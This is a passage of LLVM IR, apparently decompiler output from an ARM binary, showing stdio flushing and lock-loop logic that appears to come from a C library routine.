  %v1_18700.pre = load i32, i32* @r4, align 4
  %v1_186fc = inttoptr i32 %v0_186fc.pre to i32*
  %v2_186fc = load i32, i32* %v1_186fc, align 4
  store i32 %v2_186fc, i32* %r3.global-to-local, align 4
  %v3_18700 = icmp uge i32 %v2_186fc, %v1_18700.pre
  store i1 %v3_18700, i1* %cpsr_c.global-to-local, align 1
  %v9_18700 = icmp eq i32 %v2_186fc, %v1_18700.pre
  br i1 %v9_18700, label %dec_label_pc_18708, label %dec_label_pc_18720

dec_label_pc_1871c:                               ; preds = %dec_label_pc_18708
  %v0_1871c = load i32, i32* @r4, align 4
  store i32 %v0_1871c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18720

dec_label_pc_18720:                               ; preds = %dec_label_pc_186f0, %dec_label_pc_18708.dec_label_pc_186fc_crit_edge, %dec_label_pc_1871c
  %v0_18720 = phi i32 [ %v0_1871c, %dec_label_pc_1871c ], [ %v2_186fc144, %dec_label_pc_186f0 ], [ %v2_186fc, %dec_label_pc_18708.dec_label_pc_186fc_crit_edge ]
  %v1_18720 = phi i32 [ %v0_1871c, %dec_label_pc_1871c ], [ 0, %dec_label_pc_186f0 ], [ %v1_18700.pre, %dec_label_pc_18708.dec_label_pc_186fc_crit_edge ]
  %v3_18720 = icmp uge i32 %v0_18720, %v1_18720
  store i1 %v3_18720, i1* %cpsr_c.global-to-local, align 1
  %v9_18720 = icmp eq i32 %v0_18720, %v1_18720
  br i1 %v9_18720, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_18720
  %v1_18724 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_18724, i32* %r0.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_18720, %bb65
  %v1_18728 = xor i1 %v9_18720, true
  call void @__pseudo_cond_branch(i1 %v1_18728, i32 ptrtoint (i32* @global_var_15ff0.919 to i32))
  %v0_1872c = load i32, i32* %r8.global-to-local, align 4
  %v1_1872c = load i32, i32* %r5.global-to-local, align 4
  %v2_1872c = add i32 %v1_1872c, 8
  %v3_1872c = inttoptr i32 %v2_1872c to i32*
  store i32 %v0_1872c, i32* %v3_1872c, align 4
  br label %dec_label_pc_18730

dec_label_pc_18730:                               ; preds = %dec_label_pc_186d4, %bb66
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_18734 = load i32, i32* @r6, align 4
  %v2_18734 = add i32 %v0_18734, 160
  %v3_18734 = inttoptr i32 %v2_18734 to i32*
  %v4_18734 = load i32, i32* %v3_18734, align 4
  store i32 %v4_18734, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1873c = add i32 %v0_18734, 12
  %v3_1873c = inttoptr i32 %v2_1873c to i32*
  %v4_1873c = load i32, i32* %v3_1873c, align 4
  store i32 %v4_1873c, i32* %r2.global-to-local, align 4
  %v1_18740 = add i32 %v4_18734, 4
  %v2_18740 = inttoptr i32 %v1_18740 to i32*
  %v3_18740 = load i32, i32* %v2_18740, align 4
  store i32 %v3_18740, i32* %r1.global-to-local, align 4
  %v1_18744 = inttoptr i32 %v4_1873c to i32*
  %v2_18744 = load i32, i32* %v1_18744, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18748 = icmp eq i32 %v3_18740, 0
  %v1_1874c = add i32 %v2_18744, 1
  store i32 %v1_1874c, i32* %r3.global-to-local, align 4
  store i32 %v1_1874c, i32* %v1_18744, align 4
  br i1 %v2_18748, label %dec_label_pc_18758, label %dec_label_pc_187b8

dec_label_pc_18758:                               ; preds = %dec_label_pc_18730
  %v0_18758 = load i32, i32* %r1.global-to-local, align 4
  %v1_18758 = load i32, i32* %r0.global-to-local, align 4
  %v2_18758 = add i32 %v1_18758, 8
  %v3_18758 = inttoptr i32 %v2_18758 to i32*
  store i32 %v0_18758, i32* %v3_18758, align 4
  %v0_1875c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1875c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_18760

dec_label_pc_18760:                               ; preds = %dec_label_pc_18790.dec_label_pc_18760_crit_edge, %dec_label_pc_18758
  %v0_18760 = phi i32 [ %v0_18760.pre, %dec_label_pc_18790.dec_label_pc_18760_crit_edge ], [ %v0_1875c, %dec_label_pc_18758 ]
  %v1_18760 = inttoptr i32 %v0_18760 to i32*
  %v2_18760 = load i32, i32* %v1_18760, align 4
  store i32 %v2_18760, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_18760, i32* %r2.global-to-local, align 4
  %v2_1876c131 = load i32, i32* %v1_18760, align 4
  store i32 %v2_1876c131, i32* %r3.global-to-local, align 4
  %v3_18770133 = icmp uge i32 %v2_1876c131, %v2_18760
  store i1 %v3_18770133, i1* %cpsr_c.global-to-local, align 1
  %v9_18770139 = icmp eq i32 %v2_1876c131, %v2_18760
  br i1 %v9_18770139, label %dec_label_pc_18778, label %dec_label_pc_18790

dec_label_pc_18778:                               ; preds = %dec_label_pc_18760, %dec_label_pc_18778.dec_label_pc_1876c_crit_edge
  %v0_18778140 = phi i32 [ %v1_18770.pre, %dec_label_pc_18778.dec_label_pc_1876c_crit_edge ], [ %v2_18760, %dec_label_pc_18760 ]
  store i32 %v0_18778140, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_18788 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_18788, label %dec_label_pc_1878c, label %dec_label_pc_18778.dec_label_pc_1876c_crit_edge

dec_label_pc_18778.dec_label_pc_1876c_crit_edge:  ; preds = %dec_label_pc_18778
  %v0_1876c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_18770.pre = load i32, i32* @r4, align 4
  %v1_1876c = inttoptr i32 %v0_1876c.pre to i32*
  %v2_1876c = load i32, i32* %v1_1876c, align 4
  store i32 %v2_1876c, i32* %r3.global-to-local, align 4
  %v3_18770 = icmp uge i32 %v2_1876c, %v1_18770.pre
  store i1 %v3_18770, i1* %cpsr_c.global-to-local, align 1
  %v9_18770 = icmp eq i32 %v2_1876c, %v1_18770.pre
  br i1 %v9_18770, label %dec_label_pc_18778, label %dec_label_pc_18790

dec_label_pc_1878c:                               ; preds = %dec_label_pc_18778
  %v0_1878c = load i32, i32* @r4, align 4
  store i32 %v0_1878c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18790

dec_label_pc_18790:                               ; preds = %dec_label_pc_18760, %dec_label_pc_18778.dec_label_pc_1876c_crit_edge, %dec_label_pc_1878c
  %v0_18798 = phi i32 [ %v0_1878c, %dec_label_pc_1878c ], [ %v2_1876c131, %dec_label_pc_18760 ], [ %v2_1876c, %dec_label_pc_18778.dec_label_pc_1876c_crit_edge ]
  %v1_18790 = phi i32 [ %v0_1878c, %dec_label_pc_1878c ], [ %v2_18760, %dec_label_pc_18760 ], [ %v1_18770.pre, %dec_label_pc_18778.dec_label_pc_1876c_crit_edge ]
  %v3_18790 = icmp uge i32 %v0_18798, %v1_18790
  store i1 %v3_18790, i1* %cpsr_c.global-to-local, align 1
  %v9_18790 = icmp eq i32 %v0_18798, %v1_18790
  br i1 %v9_18790, label %dec_label_pc_18798, label %dec_label_pc_18790.dec_label_pc_18760_crit_edge

dec_label_pc_18790.dec_label_pc_18760_crit_edge:  ; preds = %dec_label_pc_18790
  %v0_18760.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_18760

dec_label_pc_18798:                               ; preds = %dec_label_pc_18790
  %v2_18798 = icmp ne i32 %v1_18790, 0
  store i1 %v2_18798, i1* %cpsr_c.global-to-local, align 1
  %v7_1879c = icmp slt i32 %v1_18790, 2
  br i1 %v7_1879c, label %dec_label_pc_187b8, label %dec_label_pc_187a0

dec_label_pc_187a0:                               ; preds = %dec_label_pc_18798
  %v0_187a0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_187a0, i32* %r0.global-to-local, align 4
  %v0_187a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_187a4 = add i32 %v0_187a4, 129
  store i32 %v1_187a4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_187b8

dec_label_pc_187b8:                               ; preds = %dec_label_pc_18730, %dec_label_pc_187a0, %dec_label_pc_18798
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_187bc = load i32, i32* @r6, align 4
  %v2_187bc = add i32 %v0_187bc, 152
  %v3_187bc = inttoptr i32 %v2_187bc to i32*
  %v4_187bc = load i32, i32* %v3_187bc, align 4
  store i32 %v4_187bc, i32* %r5.global-to-local, align 4
  %v1_187c0 = add i32 %v4_187bc, 8
  %v2_187c0 = inttoptr i32 %v1_187c0 to i32*
  %v3_187c0 = load i32, i32* %v2_187c0, align 4
  store i32 %v3_187c0, i32* %r3.global-to-local, align 4
  %v1_187c4 = load i32, i32* %r8.global-to-local, align 4
  %v3_187c4 = icmp uge i32 %v3_187c0, %v1_187c4
  store i1 %v3_187c4, i1* %cpsr_c.global-to-local, align 1
  %v9_187c4 = icmp eq i32 %v3_187c0, %v1_187c4
  br i1 %v9_187c4, label %dec_label_pc_1880c, label %dec_label_pc_187cc

dec_label_pc_187cc:                               ; preds = %dec_label_pc_187b8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_187bc, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_187d8123 = inttoptr i32 %v4_187bc to i32*
  %v2_187d8124 = load i32, i32* %v1_187d8123, align 4
  store i32 %v2_187d8124, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_187dc126 = icmp eq i32 %v2_187d8124, 0
  br i1 %v9_187dc126, label %dec_label_pc_187e4, label %dec_label_pc_187fc

dec_label_pc_187e4:                               ; preds = %dec_label_pc_187cc, %dec_label_pc_187e4.dec_label_pc_187d8_crit_edge
  %v0_187e4127 = phi i32 [ %v1_187dc.pre, %dec_label_pc_187e4.dec_label_pc_187d8_crit_edge ], [ 0, %dec_label_pc_187cc ]
  store i32 %v0_187e4127, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_187f4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_187f4, label %dec_label_pc_187f8, label %dec_label_pc_187e4.dec_label_pc_187d8_crit_edge

dec_label_pc_187e4.dec_label_pc_187d8_crit_edge:  ; preds = %dec_label_pc_187e4
  %v0_187d8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_187dc.pre = load i32, i32* @r4, align 4
  %v1_187d8 = inttoptr i32 %v0_187d8.pre to i32*
  %v2_187d8 = load i32, i32* %v1_187d8, align 4
  store i32 %v2_187d8, i32* %r3.global-to-local, align 4
  %v3_187dc = icmp uge i32 %v2_187d8, %v1_187dc.pre
  store i1 %v3_187dc, i1* %cpsr_c.global-to-local, align 1
  %v9_187dc = icmp eq i32 %v2_187d8, %v1_187dc.pre
  br i1 %v9_187dc, label %dec_label_pc_187e4, label %dec_label_pc_187fc

dec_label_pc_187f8:                               ; preds = %dec_label_pc_187e4
  %v0_187f8 = load i32, i32* @r4, align 4
  store i32 %v0_187f8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_187fc

dec_label_pc_187fc:                               ; preds = %dec_label_pc_187cc, %dec_label_pc_187e4.dec_label_pc_187d8_crit_edge, %dec_label_pc_187f8
  %v0_187fc = phi i32 [ %v0_187f8, %dec_label_pc_187f8 ], [ %v2_187d8124, %dec_label_pc_187cc ], [ %v2_187d8, %dec_label_pc_187e4.dec_label_pc_187d8_crit_edge ]
  %v1_187fc = phi i32 [ %v0_187f8, %dec_label_pc_187f8 ], [ 0, %dec_label_pc_187cc ], [ %v1_187dc.pre, %dec_label_pc_187e4.dec_label_pc_187d8_crit_edge ]
  %v3_187fc = icmp uge i32 %v0_187fc, %v1_187fc
  store i1 %v3_187fc, i1* %cpsr_c.global-to-local, align 1
  %v9_187fc = icmp eq i32 %v0_187fc, %v1_187fc
  br i1 %v9_187fc, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_187fc
  %v1_18800 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_18800, i32* %r0.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_187fc, %bb67
  %v1_18804 = xor i1 %v9_187fc, true
  call void @__pseudo_cond_branch(i1 %v1_18804, i32 ptrtoint (i32* @global_var_15ff0.919 to i32))
  %v0_18808 = load i32, i32* %r8.global-to-local, align 4
  %v1_18808 = load i32, i32* %r5.global-to-local, align 4
  %v2_18808 = add i32 %v1_18808, 8
  %v3_18808 = inttoptr i32 %v2_18808 to i32*
  store i32 %v0_18808, i32* %v3_18808, align 4
  %v0_18810.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1880c

dec_label_pc_1880c:                               ; preds = %dec_label_pc_187b8, %bb68
  %v0_1881c = phi i32 [ %v0_187bc, %dec_label_pc_187b8 ], [ %v0_18810.pre, %bb68 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_18810 = add i32 %v0_1881c, 152
  %v3_18810 = inttoptr i32 %v2_18810 to i32*
  %v4_18810 = load i32, i32* %v3_18810, align 4
  store i32 %v4_18810, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v1_18818 = add i32 %v4_18810, 4
  %v2_18818 = inttoptr i32 %v1_18818 to i32*
  %v3_18818 = load i32, i32* %v2_18818, align 4
  store i32 %v3_18818, i32* %r1.global-to-local, align 4
  %v2_1881c = add i32 %v0_1881c, 76
  %v3_1881c = inttoptr i32 %v2_1881c to i32*
  %v4_1881c = load i32, i32* %v3_1881c, align 4
  store i32 %v4_1881c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18820 = icmp eq i32 %v3_18818, 0
  %v1_18824 = inttoptr i32 %v4_1881c to i32*
  %v2_18824 = load i32, i32* %v1_18824, align 4
  store i32 %v2_18824, i32* @r5, align 4
  br i1 %v2_18820, label %dec_label_pc_1882c, label %dec_label_pc_1888c

dec_label_pc_1882c:                               ; preds = %dec_label_pc_1880c
  %v2_1882c = add i32 %v4_18810, 8
  %v3_1882c = inttoptr i32 %v2_1882c to i32*
  store i32 0, i32* %v3_1882c, align 4
  %v0_18830 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_18830, i32* @r7, align 4
  br label %dec_label_pc_18834

dec_label_pc_18834:                               ; preds = %dec_label_pc_18864.dec_label_pc_18834_crit_edge, %dec_label_pc_1882c
  %v0_18834 = phi i32 [ %v0_18834.pre, %dec_label_pc_18864.dec_label_pc_18834_crit_edge ], [ %v0_18830, %dec_label_pc_1882c ]
  %v1_18834 = inttoptr i32 %v0_18834 to i32*
  %v2_18834 = load i32, i32* %v1_18834, align 4
  store i32 %v2_18834, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_18834, i32* %r2.global-to-local, align 4
  %v2_18840111 = load i32, i32* %v1_18834, align 4
  store i32 %v2_18840111, i32* %r3.global-to-local, align 4
  %v3_18844113 = icmp uge i32 %v2_18840111, %v2_18834
  store i1 %v3_18844113, i1* %cpsr_c.global-to-local, align 1
  %v9_18844119 = icmp eq i32 %v2_18840111, %v2_18834
  br i1 %v9_18844119, label %dec_label_pc_1884c, label %dec_label_pc_18864

dec_label_pc_1884c:                               ; preds = %dec_label_pc_18834, %dec_label_pc_1884c.dec_label_pc_18840_crit_edge
  %v0_1884c120 = phi i32 [ %v1_18844.pre, %dec_label_pc_1884c.dec_label_pc_18840_crit_edge ], [ %v2_18834, %dec_label_pc_18834 ]
  store i32 %v0_1884c120, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1885c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1885c, label %dec_label_pc_18860, label %dec_label_pc_1884c.dec_label_pc_18840_crit_edge

dec_label_pc_1884c.dec_label_pc_18840_crit_edge:  ; preds = %dec_label_pc_1884c
  %v0_18840.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_18844.pre = load i32, i32* @r4, align 4
  %v1_18840 = inttoptr i32 %v0_18840.pre to i32*
  %v2_18840 = load i32, i32* %v1_18840, align 4
  store i32 %v2_18840, i32* %r3.global-to-local, align 4
  %v3_18844 = icmp uge i32 %v2_18840, %v1_18844.pre
  store i1 %v3_18844, i1* %cpsr_c.global-to-local, align 1
  %v9_18844 = icmp eq i32 %v2_18840, %v1_18844.pre
  br i1 %v9_18844, label %dec_label_pc_1884c, label %dec_label_pc_18864

dec_label_pc_18860:                               ; preds = %dec_label_pc_1884c
  %v0_18860 = load i32, i32* @r4, align 4
  store i32 %v0_18860, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18864

dec_label_pc_18864:                               ; preds = %dec_label_pc_18834, %dec_label_pc_1884c.dec_label_pc_18840_crit_edge, %dec_label_pc_18860
  %v0_1886c = phi i32 [ %v0_18860, %dec_label_pc_18860 ], [ %v2_18840111, %dec_label_pc_18834 ], [ %v2_18840, %dec_label_pc_1884c.dec_label_pc_18840_crit_edge ]
  %v1_18864 = phi i32 [ %v0_18860, %dec_label_pc_18860 ], [ %v2_18834, %dec_label_pc_18834 ], [ %v1_18844.pre, %dec_label_pc_1884c.dec_label_pc_18840_crit_edge ]
  %v3_18864 = icmp uge i32 %v0_1886c, %v1_18864
  store i1 %v3_18864, i1* %cpsr_c.global-to-local, align 1
  %v9_18864 = icmp eq i32 %v0_1886c, %v1_18864
  br i1 %v9_18864, label %dec_label_pc_1886c, label %dec_label_pc_18864.dec_label_pc_18834_crit_edge

dec_label_pc_18864.dec_label_pc_18834_crit_edge:  ; preds = %dec_label_pc_18864
  %v0_18834.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_18834

dec_label_pc_1886c:                               ; preds = %dec_label_pc_18864
  %v2_1886c = icmp ne i32 %v1_18864, 0
  store i1 %v2_1886c, i1* %cpsr_c.global-to-local, align 1
  %v7_18870 = icmp slt i32 %v1_18864, 2
  br i1 %v7_18870, label %dec_label_pc_1888cthread-pre-split, label %dec_label_pc_18874

dec_label_pc_18874:                               ; preds = %dec_label_pc_1886c
  %v0_18874 = load i32, i32* @r7, align 4
  store i32 %v0_18874, i32* %r0.global-to-local, align 4
  %v0_18878 = load i32, i32* %r1.global-to-local, align 4
  %v1_18878 = add i32 %v0_18878, 129
  store i32 %v1_18878, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1888cthread-pre-split

dec_label_pc_1888cthread-pre-split:               ; preds = %dec_label_pc_1886c, %dec_label_pc_18874
  %v0_189d8.pr.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_1888c

dec_label_pc_1888c:                               ; preds = %dec_label_pc_1888cthread-pre-split, %dec_label_pc_1880c
  %v0_189d8.pr = phi i32 [ %v0_189d8.pr.pr, %dec_label_pc_1888cthread-pre-split ], [ %v2_18824, %dec_label_pc_1880c ]
  store i32 92, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_189d818 = icmp eq i32 %v0_189d8.pr, 0
  br i1 %v2_189d818, label %dec_label_pc_189e0, label %dec_label_pc_1889c

dec_label_pc_1889c:                               ; preds = %dec_label_pc_1888c, %dec_label_pc_189d4
  %v0_188c4 = phi i32 [ %v3_189d4, %dec_label_pc_189d4 ], [ %v0_189d8.pr, %dec_label_pc_1888c ]
  %v1_1889c = inttoptr i32 %v0_188c4 to i16*
  %v2_1889c = load i16, i16* %v1_1889c, align 2
  %v3_1889c = zext i16 %v2_1889c to i32
  store i32 %v3_1889c, i32* %r3.global-to-local, align 4
  %v1_188a0 = and i32 %v3_1889c, 64
  %v2_188a0 = icmp eq i32 %v1_188a0, 0
  br i1 %v2_188a0, label %dec_label_pc_189d4, label %dec_label_pc_188a8

dec_label_pc_188a8:                               ; preds = %dec_label_pc_1889c
  %v0_188a8 = load i32, i32* @r6, align 4
  %v1_188a8 = load i32, i32* %sb.global-to-local, align 4
  %v2_188a8 = add i32 %v1_188a8, %v0_188a8
  %v3_188a8 = inttoptr i32 %v2_188a8 to i32*
  %v4_188a8 = load i32, i32* %v3_188a8, align 4
  store i32 %v4_188a8, i32* %r3.global-to-local, align 4
  %v1_188ac = inttoptr i32 %v4_188a8 to i32*
  %v2_188ac = load i32, i32* %v1_188ac, align 4
  store i32 %v2_188ac, i32* %r3.global-to-local, align 4
  %v2_188b0 = icmp ugt i32 %v2_188ac, 1
  store i1 %v2_188b0, i1* %cpsr_c.global-to-local, align 1
  %v7_188b0 = icmp eq i32 %v2_188ac, 2
  br i1 %v7_188b0, label %dec_label_pc_18914, label %dec_label_pc_188b8

dec_label_pc_188b8:                               ; preds = %dec_label_pc_188a8
  %v1_188b8 = add i32 %v0_188c4, 64
  %v2_188b8 = inttoptr i32 %v1_188b8 to i32*
  %v3_188b8 = load i32, i32* %v2_188b8, align 4
  store i32 %v3_188b8, i32* %r3.global-to-local, align 4
  %v1_188bc = load i32, i32* %r8.global-to-local, align 4
  %v3_188bc = icmp uge i32 %v3_188b8, %v1_188bc
  store i1 %v3_188bc, i1* %cpsr_c.global-to-local, align 1
  %v9_188bc = icmp eq i32 %v3_188b8, %v1_188bc
  br i1 %v9_188bc, label %dec_label_pc_18908, label %dec_label_pc_188c4

dec_label_pc_188c4:                               ; preds = %dec_label_pc_188b8
  %v1_188c4 = add i32 %v0_188c4, 56
  store i32 %v1_188c4, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_188c4, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_188d486 = inttoptr i32 %v1_188c4 to i32*
  %v2_188d487 = load i32, i32* %v1_188d486, align 4
  store i32 %v2_188d487, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_188d894 = icmp eq i32 %v2_188d487, 0
  br i1 %v9_188d894, label %dec_label_pc_188e0, label %dec_label_pc_188f8

dec_label_pc_188e0:                               ; preds = %dec_label_pc_188c4, %dec_label_pc_188e0.dec_label_pc_188d4_crit_edge
  %v0_188e095 = phi i32 [ %v1_188d8.pre, %dec_label_pc_188e0.dec_label_pc_188d4_crit_edge ], [ 0, %dec_label_pc_188c4 ]
  store i32 %v0_188e095, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_188f0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_188f0, label %dec_label_pc_188f4, label %dec_label_pc_188e0.dec_label_pc_188d4_crit_edge

dec_label_pc_188e0.dec_label_pc_188d4_crit_edge:  ; preds = %dec_label_pc_188e0
  %v0_188d4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_188d8.pre = load i32, i32* @r4, align 4
  %v1_188d4 = inttoptr i32 %v0_188d4.pre to i32*
  %v2_188d4 = load i32, i32* %v1_188d4, align 4
  store i32 %v2_188d4, i32* %r3.global-to-local, align 4
  %v3_188d8 = icmp uge i32 %v2_188d4, %v1_188d8.pre
  store i1 %v3_188d8, i1* %cpsr_c.global-to-local, align 1
  %v9_188d8 = icmp eq i32 %v2_188d4, %v1_188d8.pre
  br i1 %v9_188d8, label %dec_label_pc_188e0, label %dec_label_pc_188f8

dec_label_pc_188f4:                               ; preds = %dec_label_pc_188e0
  %v0_188f4 = load i32, i32* @r4, align 4
  store i32 %v0_188f4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_188f8

dec_label_pc_188f8:                               ; preds = %dec_label_pc_188c4, %dec_label_pc_188e0.dec_label_pc_188d4_crit_edge, %dec_label_pc_188f4
  %v0_188f8 = phi i32 [ %v0_188f4, %dec_label_pc_188f4 ], [ %v2_188d487, %dec_label_pc_188c4 ], [ %v2_188d4, %dec_label_pc_188e0.dec_label_pc_188d4_crit_edge ]
  %v1_188f8 = phi i32 [ %v0_188f4, %dec_label_pc_188f4 ], [ 0, %dec_label_pc_188c4 ], [ %v1_188d8.pre, %dec_label_pc_188e0.dec_label_pc_188d4_crit_edge ]
  %v3_188f8 = icmp uge i32 %v0_188f8, %v1_188f8
  store i1 %v3_188f8, i1* %cpsr_c.global-to-local, align 1
  %v9_188f8 = icmp eq i32 %v0_188f8, %v1_188f8
  br i1 %v9_188f8, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_188f8
  %v1_188fc = load i32, i32* @r7, align 4
  store i32 %v1_188fc, i32* %r0.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_188f8, %bb69
  %v1_18900 = xor i1 %v9_188f8, true
  call void @__pseudo_cond_branch(i1 %v1_18900, i32 ptrtoint (i32* @global_var_15ff0.919 to i32))
  %v0_18904 = load i32, i32* %r8.global-to-local, align 4
  %v1_18904 = load i32, i32* @r5, align 4
  %v2_18904 = add i32 %v1_18904, 64
  %v3_18904 = inttoptr i32 %v2_18904 to i32*
  store i32 %v0_18904, i32* %v3_18904, align 4
  %v0_18908.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18908

dec_label_pc_18908:                               ; preds = %dec_label_pc_188b8, %bb70
  %v0_18908 = phi i32 [ %v0_188c4, %dec_label_pc_188b8 ], [ %v0_18908.pre, %bb70 ]
  %v1_18908 = add i32 %v0_18908, 60
  %v2_18908 = inttoptr i32 %v1_18908 to i32*
  %v3_18908 = load i32, i32* %v2_18908, align 4
  %v1_1890c = add i32 %v3_18908, 1
  store i32 %v1_1890c, i32* %r3.global-to-local, align 4
  store i32 %v1_1890c, i32* %v2_18908, align 4
  %v0_18914.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18914

dec_label_pc_18914:                               ; preds = %dec_label_pc_188a8, %dec_label_pc_18908
  %v0_1892c = phi i32 [ %v0_188c4, %dec_label_pc_188a8 ], [ %v0_18914.pre, %dec_label_pc_18908 ]
  %v1_18914 = inttoptr i32 %v0_1892c to i16*
  %v2_18914 = load i16, i16* %v1_18914, align 2
  %v3_18914 = zext i16 %v2_18914 to i32
  store i32 %stack_var_-44.1, i32* %r2.global-to-local, align 4
  %v2_1891c = or i32 %v3_18914, %stack_var_-44.1
  %v1_18920 = xor i32 %v2_1891c, 320
  store i32 %v1_18920, i32* %r3.global-to-local, align 4
  %v1_18924 = and i32 %v1_18920, 832
  %v2_18924 = icmp eq i32 %v1_18924, 0
  br i1 %v2_18924, label %dec_label_pc_1892c, label %bb71

dec_label_pc_1892c:                               ; preds = %dec_label_pc_18914
  store i32 %v0_1892c, i32* %r0.global-to-local, align 4
  %v1_18930 = call i32 @__stdio_wcommit(i32 %v0_1892c)
  store i32 %v1_18930, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18934 = icmp eq i32 %v1_18930, 0
  br i1 %v2_18934, label %.thread6, label %.thread7

.thread6:                                         ; preds = %dec_label_pc_1892c
  %v1_18938 = load i32, i32* @r5, align 4
  %v2_18938 = inttoptr i32 %v1_18938 to i16*
  %v3_18938 = load i16, i16* %v2_18938, align 2
  %v4_18938 = zext i16 %v3_18938 to i32
  store i32 %v4_18938, i32* %r3.global-to-local, align 4
  %v2_1893c = add i32 %v1_18938, 8
  %v3_1893c = inttoptr i32 %v2_1893c to i32*
  %v4_1893c = load i32, i32* %v3_1893c, align 4
  store i32 %v4_1893c, i32* %r2.global-to-local, align 4
  %v2_18940 = and i32 %v4_18938, 65471
  store i32 %v2_18940, i32* %r3.global-to-local, align 4
  %v3_18944 = add i32 %v1_18938, 28
  %v4_18944 = inttoptr i32 %v3_18944 to i32*
  store i32 %v4_1893c, i32* %v4_18944, align 4
  %v1_18948 = load i32, i32* %r3.global-to-local, align 4
  %v2_18948 = trunc i32 %v1_18948 to i16
  %v3_18948 = load i32, i32* @r5, align 4
  %v4_18948 = inttoptr i32 %v3_18948 to i16*
  store i16 %v2_18948, i16* %v4_18948, align 2
  br label %bb71

.thread7:                                         ; preds = %dec_label_pc_1892c
  %v1_1894c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_1894c, i32* %sl.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %.thread6, %dec_label_pc_18914, %.thread7
  %v0_18950 = load i32, i32* @r6, align 4
  %v1_18950 = load i32, i32* %sb.global-to-local, align 4
  %v2_18950 = add i32 %v1_18950, %v0_18950
  %v3_18950 = inttoptr i32 %v2_18950 to i32*
  %v4_18950 = load i32, i32* %v3_18950, align 4
  store i32 %v4_18950, i32* %r3.global-to-local, align 4
  %v1_18954 = inttoptr i32 %v4_18950 to i32*
  %v2_18954 = load i32, i32* %v1_18954, align 4
  store i32 %v2_18954, i32* %r3.global-to-local, align 4
  %v2_18958 = icmp ugt i32 %v2_18954, 1
  store i1 %v2_18958, i1* %cpsr_c.global-to-local, align 1
  %v7_18958 = icmp eq i32 %v2_18954, 2
  br i1 %v7_18958, label %dec_label_pc_189d4, label %dec_label_pc_18960

dec_label_pc_18960:                               ; preds = %bb71
  %v0_18960 = load i32, i32* @r5, align 4
  %v1_18960 = add i32 %v0_18960, 60
  %v2_18960 = inttoptr i32 %v1_18960 to i32*
  %v3_18960 = load i32, i32* %v2_18960, align 4
  %v1_18964 = add i32 %v3_18960, -1
  store i32 %v1_18964, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
